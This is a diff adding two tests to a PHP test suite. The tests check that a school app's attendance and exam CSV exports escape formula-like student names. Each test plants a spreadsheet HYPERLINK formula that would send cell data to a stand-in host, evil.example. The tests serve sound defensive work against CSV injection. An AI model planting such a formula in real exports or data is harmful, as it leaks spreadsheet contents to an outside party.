@@ -91,6 +91,15 @@ test('the attendance report exports students as CSV', function () {
         ->toContain(',1,1,2,0,4,50');
 });
 
+test('the attendance export writes a formula-like student name as text', function () {
+    $this->poor->update(['first_name' => '=HYPERLINK("https://evil.example/?"&A1,"Open")']);
+    seedMarch();
+
+    $csv = $this->get('/admin/reports/attendance?division='.$this->division->id.'&format=csv')->streamedContent();
+
+    expect($csv)->toContain('"\'=HYPERLINK(')->not->toContain('"=HYPERLINK(');
+});
+
 test('the exam report shows pass rate, average and top student per division and subject', function () {
     $exam = Exam::factory()->published()->create(['name' => 'Spring Exam']);
     $subject = Subjects::factory()->create(['subject_name' => 'Zoology']);
@@ -110,6 +119,17 @@ test('the exam report shows pass rate, average and top student per division and 
 
     $csv = $this->get('/admin/reports/exams?exam='.$exam->id.'&format=csv')->streamedContent();
     expect($csv)->toContain('Division,Students,Complete,Passed')->toContain(',2,2,1,50,60,');
+});
+
+test('the exam report export writes a formula-like top student name as text', function () {
+    $this->good->update(['first_name' => '=HYPERLINK("https://evil.example/?"&A1,"Open")']);
+    $exam = Exam::factory()->published()->create();
+    $subject = Subjects::factory()->create();
+    Mark::factory()->create(['exam_id' => $exam->id, 'student_id' => $this->good->id, 'subject_id' => $subject->id, 'division_id' => $this->division->id, 'marks' => 90]);
+
+    $csv = $this->get('/admin/reports/exams?exam='.$exam->id.'&format=csv')->streamedContent();
+
+    expect($csv)->toContain('"\'=HYPERLINK(')->not->toContain('"=HYPERLINK(');
 });
 
 test('the exam report handles no exams', function () {
